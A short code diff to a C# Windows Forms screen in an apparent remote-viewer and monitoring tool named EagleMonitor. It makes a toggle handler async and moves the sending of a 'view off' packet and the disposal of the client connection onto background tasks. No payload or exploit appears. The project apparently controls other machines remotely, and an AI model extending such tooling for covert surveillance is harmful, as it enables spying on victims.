@@ -6,6 +6,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 /* 
@@ -38,7 +39,7 @@ namespace EagleMonitor.Forms
             keysPressed = new List<Keys>();
         }
       
-        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
+        private async void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
             if (captureGuna2ToggleSwitch.Checked)
             {
@@ -63,7 +64,8 @@ namespace EagleMonitor.Forms
                 this.loadingCircle1.Visible = false;
                 this.loadingCircle1.Active = false;
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF);
-                this.clientHandler.SendPacket(remoteViewerPacket);
+                await Task.Run(() => this.clientHandler.SendPacket(remoteViewerPacket));
+                await Task.Run(() => this.clientHandler.Dispose());
             }
         }
 
@@ -286,7 +288,6 @@ namespace EagleMonitor.Forms
                 };
                 this.clientHandler.SendPacket(remoteViewerPacket);
             }
-
             this.Close();
         }
 
